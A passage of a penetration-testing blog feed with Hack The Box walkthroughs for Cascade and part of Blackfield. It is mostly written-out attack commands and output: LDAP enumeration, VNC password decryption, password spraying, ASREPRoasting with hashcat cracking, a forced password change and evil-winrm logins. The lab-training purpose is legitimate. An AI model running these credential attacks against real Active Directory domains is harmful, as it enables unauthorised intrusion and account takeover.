Cascade is a medium Windows machine configured as a Domain Controller. LDAP anonymous binds are enabled, and enumeration yields the password for user r.thompson, which gives access to a TightVNC registry backup. The backup is decrypted to gain the password for s.smith. This user has access to a .NET executable, which after decompilation and source code analysis reveals the password for the ArkSvc account. This account belongs to the AD Recycle Bin group, and is able to view deleted Active Directory objects. One of the deleted user accounts is found to contain a hardcoded password, which can be reused to login as the primary domain administrator. 
Initial NmapPORT      STATE SERVICE       REASON          VERSION53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)| dns-nsid:|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-05 15:34:05Z)135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)445/tcp   open  microsoft-ds? syn-ack ttl 127636/tcp   open  tcpwrapped    syn-ack ttl 1273268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)3269/tcp  open  tcpwrapped    syn-ack ttl 1275985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.049158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49165/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

LDAPChecking if Anonymous LDAP binding is enabled.
$ ldapsearch -x -H ldap://10.10.10.182 -b &quot;DC=cascade,DC=local&quot; &#x27;(objectClass=person)&#x27;&lt;SNIP&gt;name: Ryan ThompsonobjectGUID:: LfpD6qngUkupEy9bFXBBjA==userAccountControl: 66048badPwdCount: 2codePage: 0countryCode: 0badPasswordTime: 133856782280227955lastLogoff: 0lastLogon: 133856660661946343pwdLastSet: 132230718862636251primaryGroupID: 513objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==accountExpires: 9223372036854775807logonCount: 2sAMAccountName: r.thompsonsAMAccountType: 805306368userPrincipalName: r.thompson@cascade.localobjectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=localdSCorePropagationData: 20200126183918.0ZdSCorePropagationData: 20200119174753.0ZdSCorePropagationData: 20200119174719.0ZdSCorePropagationData: 20200119174508.0ZdSCorePropagationData: 16010101000000.0ZlastLogonTimestamp: 133856660661946343msDS-SupportedEncryptionTypes: 0cascadeLegacyPwd: &lt;SNIP&gt;&lt;SNIP&gt;
This reveals a cascadeLegacyPwd for r.thompson. We can use base64 to decode this perhaps.
$ echo &lt;SNIP&gt; | base64 -d&lt;SNIP&gt;

SMBWe can try r.thompson and the password we have to see what shares are available.
$ nxc smb 10.10.10.182 -u r.thompson -p &lt;SNIP&gt; --sharesSMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:&lt;SNIP&gt;SMB         10.10.10.182    445    CASC-DC1         [*] Enumerated sharesSMB         10.10.10.182    445    CASC-DC1         Share           Permissions     RemarkSMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote AdminSMB         10.10.10.182    445    CASC-DC1         Audit$SMB         10.10.10.182    445    CASC-DC1         C$                              Default shareSMB         10.10.10.182    445    CASC-DC1         Data            READSMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPCSMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server shareSMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer DriversSMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share
Getting a mix on tools and using smbmap we see whats in the Data share.
$ smbmap -H 10.10.10.182 -u r.thompson -p &lt;SNIP&gt; -R Data[+] IP: 10.10.10.182:445	Name: casc-dc1	Disk                                                  	Permissions	Comment	----                                                  	-----------	-------	Data                                              	READ ONLY		.\Data\*	dr--r--r--                0 Tue Jan 28 16:05:51 2020	.	dr--r--r--                0 Tue Jan 28 16:05:51 2020	..	dr--r--r--                0 Sun Jan 12 19:45:14 2020	Contractors	dr--r--r--                0 Sun Jan 12 19:45:10 2020	Finance	dr--r--r--                0 Tue Jan 28 12:04:51 2020	IT	dr--r--r--                0 Sun Jan 12 19:45:20 2020	Production	dr--r--r--                0 Sun Jan 12 19:45:16 2020	Temps	.\Data\IT\*	dr--r--r--                0 Tue Jan 28 12:04:51 2020	.	dr--r--r--                0 Tue Jan 28 12:04:51 2020	..	dr--r--r--                0 Tue Jan 28 12:00:30 2020	Email Archives	dr--r--r--                0 Tue Jan 28 12:04:51 2020	LogonAudit	dr--r--r--                0 Tue Jan 28 18:53:04 2020	Logs	dr--r--r--                0 Tue Jan 28 16:06:59 2020	Temp	.\Data\IT\Email Archives\*	dr--r--r--                0 Tue Jan 28 12:00:30 2020	.	dr--r--r--                0 Tue Jan 28 12:00:30 2020	..	fr--r--r--             2522 Tue Jan 28 12:00:30 2020	Meeting_Notes_June_2018.html	.\Data\IT\Logs\*	dr--r--r--                0 Tue Jan 28 18:53:04 2020	.	dr--r--r--                0 Tue Jan 28 18:53:04 2020	..	dr--r--r--                0 Tue Jan 28 18:53:04 2020	Ark AD Recycle Bin	dr--r--r--                0 Tue Jan 28 18:56:00 2020	DCs	.\Data\IT\Logs\Ark AD Recycle Bin\*	dr--r--r--                0 Tue Jan 28 18:53:04 2020	.	dr--r--r--                0 Tue Jan 28 18:53:04 2020	..	fr--r--r--             1303 Tue Jan 28 19:19:11 2020	ArkAdRecycleBin.log	.\Data\IT\Logs\DCs\*	dr--r--r--                0 Tue Jan 28 18:56:00 2020	.	dr--r--r--                0 Tue Jan 28 18:56:00 2020	..	fr--r--r--             5967 Sun Jan 26 16:22:05 2020	dcdiag.log	.\Data\IT\Temp\*	dr--r--r--                0 Tue Jan 28 16:06:59 2020	.	dr--r--r--                0 Tue Jan 28 16:06:59 2020	..	dr--r--r--                0 Tue Jan 28 16:06:55 2020	r.thompson	dr--r--r--                0 Tue Jan 28 14:00:05 2020	s.smith	.\Data\IT\Temp\s.smith\*	dr--r--r--                0 Tue Jan 28 14:00:05 2020	.	dr--r--r--                0 Tue Jan 28 14:00:05 2020	..	fr--r--r--             2680 Tue Jan 28 14:00:01 2020	VNC Install.reg

VNC Registry FileThe VNC Install.reg was the only thing that held any real data we could use. After downloading it and opening it we see a password in hex for TightVNC.
Using a little trick I found on github for VNCDecrypt, I can decrpyt this hex password.
$ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv00000000  73 54 33 33 33 76 65 32                           |&lt;SNIP&gt;|00000008

Password SprayingAfter getting this password, we try to spray the domain and came out successful.
$ nxc smb 10.10.10.182 -u users.lst -p &lt;SNIP&gt;SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\CascGuest:&lt;SNIP&gt; STATUS_LOGON_FAILURESMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\arksvc:&lt;SNIP&gt; STATUS_LOGON_FAILURESMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:&lt;SNIP&gt;
We got a hit on s.smith, so we can see what else they might have access to via SMB.

SMasHing SMB with s.smithLooking into shares we see we have access the a Audit Share.
$ smbmap -H 10.10.10.182 -u s.smith -p &lt;SNIP&gt;[+] IP: 10.10.10.182:445	Name: casc-dc1	Disk                                                  	Permissions	Comment	----                                                  	-----------	-------	ADMIN$                                            	NO ACCESS	Remote Admin	Audit$                                            	READ ONLY		C$                                                	NO ACCESS	Default share	Data                                              	READ ONLY		IPC$                                              	NO ACCESS	Remote IPC	NETLOGON                                          	READ ONLY	Logon server share	print$                                            	READ ONLY	Printer Drivers	SYSVOL                                            	READ ONLY	Logon server share
Looking into this share we have a couple of files and maybe a custom exe file.
$ smbmap -H 10.10.10.182 -u s.smith -p &lt;SNIP&gt; -R &#x27;Audit$&#x27;[+] IP: 10.10.10.182:445	Name: casc-dc1	Disk                                                  	Permissions	Comment	----                                                  	-----------	-------	Audit$                                            	READ ONLY		.\Audit$\*	dr--r--r--                0 Wed Jan 29 12:01:26 2020	.	dr--r--r--                0 Wed Jan 29 12:01:26 2020	..	fr--r--r--            13312 Tue Jan 28 15:47:08 2020	CascAudit.exe	fr--r--r--            12288 Wed Jan 29 12:01:26 2020	CascCrypto.dll	dr--r--r--                0 Tue Jan 28 15:43:18 2020	DB	fr--r--r--               45 Tue Jan 28 17:29:47 2020	RunAudit.bat	fr--r--r--           363520 Tue Jan 28 14:42:18 2020	System.Data.SQLite.dll	fr--r--r--           186880 Tue Jan 28 14:42:18 2020	System.Data.SQLite.EF6.dll	dr--r--r--                0 Tue Jan 28 14:42:18 2020	x64	dr--r--r--                0 Tue Jan 28 14:42:18 2020	x86	.\Audit$\DB\*	dr--r--r--                0 Tue Jan 28 15:43:18 2020	.	dr--r--r--                0 Tue Jan 28 15:43:18 2020	..	fr--r--r--            24576 Tue Jan 28 15:43:18 2020	Audit.db	.\Audit$\x64\*	dr--r--r--                0 Tue Jan 28 14:42:18 2020	.	dr--r--r--                0 Tue Jan 28 14:42:18 2020	..	fr--r--r--          1639936 Tue Jan 28 14:42:18 2020	SQLite.Interop.dll	.\Audit$\x86\*	dr--r--r--                0 Tue Jan 28 14:42:18 2020	.	dr--r--r--                0 Tue Jan 28 14:42:18 2020	..	fr--r--r--          1246720 Tue Jan 28 14:42:18 2020	SQLite.Interop.dll

Source Code AnalysisWe can download CascAudit.exe and see what thats about. We get it to our Windows VM and open it in dnSpy, and look at the MainModule.
This shows us a part of the executable that uses sqlite to create an account over LDAP, I suppose. As well as a function Crypto that wasn’t mentioned in the code. So it must be in a dll on the share. Guess we’ll go find more in the Audit Share. We can grab the CascCrypto.dll and Audit.db and check these out. 
# Audit.db$ sqlite3 10.10.10.182-Audit_DB_Audit.db &#x27;.dump&#x27;\PRAGMA foreign_keys=OFF;BEGIN TRANSACTION;CREATE TABLE IF NOT EXISTS &quot;Ldap&quot; (	&quot;Id&quot;	INTEGER PRIMARY KEY AUTOINCREMENT,	&quot;uname&quot;	TEXT,	&quot;pwd&quot;	TEXT,	&quot;domain&quot;	TEXT);INSERT INTO Ldap VALUES(1,&#x27;ArkSvc&#x27;,&#x27;&lt;BASE64&gt;&#x27;,&#x27;cascade.local&#x27;);CREATE TABLE IF NOT EXISTS &quot;Misc&quot; (	&quot;Id&quot;	INTEGER PRIMARY KEY AUTOINCREMENT,&lt;SNIP&gt;
So we have a hash for the user ArkSvc. Next we look at the dll we got back in dnSpy.We have the function Crypto and looking it over we see were using AES. Doing some research and looking at cipher mode CBC as mention in the dll code (aes.Mode = CipherMode.CBC;),we first we need to install pyaes (apt install python-pyaes). Then use python to decrypt the password we have from the sqlite database. 
$ python3Python 3.11.2 (main, Nov 30 2024, 21:22:50) [GCC 12.2.0] on linuxType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; import pyaes&gt;&gt;&gt; from base64 import b64decode&gt;&gt;&gt; key = b&#x27;KEY&#x27;&gt;&gt;&gt; iv = b&#x27;IV&#x27;&gt;&gt;&gt; aes = pyaes.AESModeOfOperationCBC(key, iv = iv)&gt;&gt;&gt; decrypted = aes.decrypt(b64decode(&#x27;&lt;BASE64&gt;&#x27;))&gt;&gt;&gt; print(decrypted.decode())&lt;SNIP&gt;&gt;&gt;&gt;
We got the password for arksvc. We can check our access with nxc.
$ nxc winrm 10.10.10.182 -u arksvc -p &lt;SNIP&gt;WINRM       10.10.10.182    5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\arksvc:&lt;SNIP&gt; (Pwn3d!)
Lets get access and snoop around. 
Shell as arksvc$ evil-winrm -i 10.10.10.182 -u arksvc -p &lt;SNIP&gt;&lt;SNIP&gt;*Evil-WinRM* PS C:\Users\arksvc\Documents&gt; whoami /groupsGROUP INFORMATION-----------------Group Name                                  Type             SID                                            Attributes=========================================== ================ ============================================== ===============================================================Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled groupBUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled groupBUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled groupCASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local GroupCASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local GroupCASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local GroupCASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local GroupNT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group

We see were in the AD Recycle Bin Group, and looking online we find a github stating that the Group has the permissions to read deleted AD objects. We can try to see if there is anything that has been deleted.
PrivEsc*Evil-WinRM* PS C:\Users\arksvc\Documents&gt; Get-ADObject -filter &#x27;isDeleted -eq $true&#x27; -includeDeletedObjects -Properties *&lt;SNIP&gt;accountExpires                  : 9223372036854775807badPasswordTime                 : 0badPwdCount                     : 0CanonicalName                   : cascade.local/Deleted Objects/TempAdmin                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059cascadeLegacyPwd                : &lt;BASE64&gt;CN                              : TempAdmin                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059codePage                        : 0countryCode                     : 0Created                         : 1/27/2020 3:23:08 AM&lt;SNIP&gt;
We happen to have another cascadeLegacyPwd we can decode.
$ echo &lt;BASE64&gt;| base64 -d&lt;SNIP&gt;


Seeing as this was for the TempAdmin, we can try Administrator with this password.
$ evil-winrm -i 10.10.10.182 -u Administrator -p &lt;SNIP&gt;Evil-WinRM shell v3.5Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami;hostnamecascade\administratorCASC-DC1

]]></content>
      <categories>
        <category>htb</category>
      </categories>
      <tags>
        <tag>SMB</tag>
        <tag>LDAP</tag>
        <tag>Registry</tag>
        <tag>.NET</tag>
        <tag>Source Code Analysis</tag>
        <tag>AD Recycle Bin Group</tag>
      </tags>
  </entry>
  <entry>
    <title>Blackfield (Windows Hard)</title>
    <url>/2025/02/24/blackfield/</url>
    <content><![CDATA[
Backfield is a hard Windows machine featuring Windows and Active Directory misconfigurations. Anonymous &#x2F; Guest access to an SMB share is used to enumerate users. The user is found to have Kerberos pre-authentication disabled, which allows us to conduct an ASREPRoasting attack. This allows us to retrieve a hash of the encrypted material contained in the AS-REP, which can be subjected to an offline brute force attack in order to recover the plaintext password. With this user we can access a SMB share containing forensics artifacts, including an lsass process dump. This contains a username and a password for a user with WinRM privileges, who is also a member of the Backup Operators group. The privileges conferred by this privileged group are used to dump the Active Directory database, and retrieve the hash of the primary domain administrator. 
NmapPORT      STATE SERVICE       REASON          VERSION53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-02-28 22:58:26Z)135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)445/tcp   open  microsoft-ds? syn-ack ttl 127593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.03268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPCService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

SMBLooking into shares:
nxc smb blackfield.local -u Guest -p &#x27;&#x27; --sharesSMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\Guest:SMB         10.10.10.192    445    DC01             [*] Enumerated sharesSMB         10.10.10.192    445    DC01             Share           Permissions     RemarkSMB         10.10.10.192    445    DC01             -----           -----------     ------SMB         10.10.10.192    445    DC01             ADMIN$                          Remote AdminSMB         10.10.10.192    445    DC01             C$                              Default shareSMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPCSMB         10.10.10.192    445    DC01             NETLOGON                        Logon server shareSMB         10.10.10.192    445    DC01             profiles$       READSMB         10.10.10.192    445    DC01             SYSVOL                          Logon server share

Since Guest was enabled, I tried getting users by rid bruteforcing. This gave us ALOT of users.
$ nxc smb blackfield.local -u Guest -p &#x27;&#x27; --rid-brute&lt;SNIP&gt;SMB         10.10.10.192    445    DC01             1000: BLACKFIELD\DC01$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1101: BLACKFIELD\DnsAdmins (SidTypeAlias)SMB         10.10.10.192    445    DC01             1102: BLACKFIELD\DnsUpdateProxy (SidTypeGroup)SMB         10.10.10.192    445    DC01             1103: BLACKFIELD\audit2020 (SidTypeUser)SMB         10.10.10.192    445    DC01             1104: BLACKFIELD\support (SidTypeUser)SMB         10.10.10.192    445    DC01             1105: BLACKFIELD\BLACKFIELD764430 (SidTypeUser)SMB         10.10.10.192    445    DC01             1106: BLACKFIELD\BLACKFIELD538365 (SidTypeUser)&lt;SNIP&gt;SMB         10.10.10.192    445    DC01             1411: BLACKFIELD\BLACKFIELD653097 (SidTypeUser)SMB         10.10.10.192    445    DC01             1412: BLACKFIELD\BLACKFIELD438814 (SidTypeUser)SMB         10.10.10.192    445    DC01             1413: BLACKFIELD\svc_backup (SidTypeUser)SMB         10.10.10.192    445    DC01             1414: BLACKFIELD\lydericlefebvre (SidTypeUser)SMB         10.10.10.192    445    DC01             1415: BLACKFIELD\PC01$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1416: BLACKFIELD\PC02$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1417: BLACKFIELD\PC03$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1418: BLACKFIELD\PC04$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1419: BLACKFIELD\PC05$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1420: BLACKFIELD\PC06$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1421: BLACKFIELD\PC07$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1422: BLACKFIELD\PC08$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1423: BLACKFIELD\PC09$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1424: BLACKFIELD\PC10$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1425: BLACKFIELD\PC11$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1426: BLACKFIELD\PC12$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1427: BLACKFIELD\PC13$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1428: BLACKFIELD\SRV-WEB$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1429: BLACKFIELD\SRV-FILE$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1430: BLACKFIELD\SRV-EXCHANGE$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1431: BLACKFIELD\SRV-INTRANET$ (SidTypeUser)

KERBEROSFrom there I validated users via kerbrute. All of them seemed to be valid so thats a drag.
$ kerbrute userenum --dc 10.10.10.192 -d blackfield.local users.list    __             __               __   / /_____  _____/ /_  _______  __/ /____  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __//_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/Version: v1.0.3 (9dad6e1) - 02/28/25 - Ronnie Flathers @ropnop2025/02/28 11:30:45 &gt;  Using KDC(s):2025/02/28 11:30:45 &gt;  	10.10.10.192:882025/02/28 11:30:50 &gt;  [+] VALID USERNAME:	 Administrator@blackfield.local2025/02/28 11:30:50 &gt;  [+] VALID USERNAME:	 audit2020@blackfield.local2025/02/28 11:30:50 &gt;  [+] VALID USERNAME:	 BLACKFIELD189208@blackfield.local2025/02/28 11:30:50 &gt;  [+] VALID USERNAME:	 DC01$@blackfield.local2025/02/28 11:30:50 &gt;  [+] VALID USERNAME:	 Guest@blackfield.local2025/02/28 11:30:50 &gt;  [+] VALID USERNAME:	 support@blackfield.local&lt;SNIP&gt;2025/02/28 11:33:27 &gt;  [+] VALID USERNAME:	 svc_backup@blackfield.local2025/02/28 11:33:27 &gt;  [+] VALID USERNAME:	 BLACKFIELD438814@blackfield.local2025/02/28 11:33:27 &gt;  [+] VALID USERNAME:	 BLACKFIELD653097@blackfield.local2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC10$@blackfield.local2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC07$@blackfield.local2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 SRV-WEB$@blackfield.local2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC09$@blackfield.local2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC13$@blackfield.local2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC11$@blackfield.local2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC05$@blackfield.local2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC06$@blackfield.local2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC08$@blackfield.local2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC12$@blackfield.local2025/02/28 11:33:38 &gt;  [+] VALID USERNAME:	 SRV-EXCHANGE$@blackfield.local2025/02/28 11:33:38 &gt;  [+] VALID USERNAME:	 SRV-FILE$@blackfield.local2025/02/28 11:33:38 &gt;  [+] VALID USERNAME:	 SRV-INTRANET$@blackfield.local2025/02/28 11:33:38 &gt;  Done! Tested 333 usernames (332 valid) in 172.662 seconds
Never the less, I wanted to see if anyone has PRE-AUTH DISABLED. We got one user support.
$ GetNPUsers.py -dc-ip 10.10.10.192 -dc-host blackfield.local -usersfile users.list -no-pass &#x27;blackfield.local/&#x27;[-] User Administrator doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User Guest doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] User DC01$ doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User audit2020 doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$support@BLACKFIELD.LOCAL:a0fc2d3cd96d551c43ed7ddfcf9f0efa$9861e8be198b1bbf19120a2f99a8&lt;SNIP&gt;[-] User BLACKFIELD764430 doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User BLACKFIELD538365 doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User BLACKFIELD189208 doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User BLACKFIELD404458 doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User BLACKFIELD706381 doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set&lt;SNIP&gt;
Cracking this with hashcat gives us a clear text password.
$ hashcat support.hash /usr/share/wordlists/rockyou.txt --showHash-mode was not specified with -m. Attempting to auto-detect hash mode.The following mode was auto-detected as the only one matching your input hash:18200 | Kerberos 5, etype 23, AS-REP | Network ProtocolNOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!Do NOT report auto-detect issues unless you are certain of the hash type.$krb5asrep$23$support@BLACKFIELD.LOCAL:a0fc2d3cd96d551c43ed7ddfcf9f0efa$9861e8be198b1bbf19120a2f99a8d05d7363d86f881bc81256c8271b7f1985c&lt;SNIP&gt;4ea9c8feea6ec223314fc227ee3c240d7f03998089456763f2cdb4aace7a32d41f6f9b9b11d2553afdb985948a6f58e2366b804:&lt;SNIP&gt;

BloodHoundNow we have some credentials to get a bloodhound dump.
$ nxc ldap 10.10.10.192 -u support -p &#x27;&lt;SNIP&gt;&#x27; --dns-server 10.10.10.192 --bloodhound -c AllSMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)LDAP        10.10.10.192    389    DC01             [+] BLACKFIELD.local\support:&lt;SNIP&gt;LDAP        10.10.10.192    389    DC01             Resolved collection methods: rdp, acl, container, session, trusts, psremote, dcom, objectprops, localadmin, groupLDAP        10.10.10.192    389    DC01             Done in 00M 08SLDAP        10.10.10.192    389    DC01             Compressing output into /home/jaybit/.nxc/logs/DC01_10.10.10.192_2025-02-28_114320_bloodhound.zip
Looking at our pwnd user support, we see we have ForceChangePassword over audit2020. So using bloodyAD(MyFaV), we change his password.
$ ./bloodyAD.py -v DEBUG -u &#x27;support&#x27; -p &#x27;&lt;SNIP&gt;&#x27; --host 10.10.10.192 -d blackfield.local set password audit2020 Password123[*] Trying to connect to 10.10.10.192...[+] Connection successful[+] Password changed successfully!
Now back to SMB and see what he has access to.
SMB Round 2Running NetExec shows we have READ to the forencis share.
$ nxc smb blackfield.local -u audit2020 -p Password123 --sharesSMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:Password123SMB         10.10.10.192    445    DC01             [*] Enumerated sharesSMB         10.10.10.192    445    DC01             Share           Permissions     RemarkSMB         10.10.10.192    445    DC01             -----           -----------     ------SMB         10.10.10.192    445    DC01             ADMIN$                          Remote AdminSMB         10.10.10.192    445    DC01             C$                              Default shareSMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPCSMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server shareSMB         10.10.10.192    445    DC01             profiles$       READSMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share
Looking into this share with impacket-smbclient showed us a couple to choose from.
$ impacket-smbclient -dc-ip 10.10.10.192 &#x27;blackfield.local/audit2020:Password123@blackfield.local&#x27;Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companiesType help for list of commands# use forensic# lsdrw-rw-rw-          0  Sun Feb 23 09:10:16 2020 .drw-rw-rw-          0  Sun Feb 23 09:10:16 2020 ..drw-rw-rw-          0  Sun Feb 23 12:14:37 2020 commands_outputdrw-rw-rw-          0  Thu May 28 15:29:24 2020 memory_analysisdrw-rw-rw-          0  Fri Feb 28 16:30:34 2020 tools
This looks like a dump of some sort from the DC based on the tools and commands_output directory.
Tools Directory:
# lsdrw-rw-rw-          0  Fri Feb 28 16:30:34 2020 .drw-rw-rw-          0  Fri Feb 28 16:30:34 2020 ..drw-rw-rw-          0  Fri Feb 28 16:30:34 2020 sleuthkit-4.8.0-win32drw-rw-rw-          0  Fri Feb 28 16:30:35 2020 sysinternalsdrw-rw-rw-          0  Fri Feb 28 16:30:35 2020 volatility
Commands_output Directory:
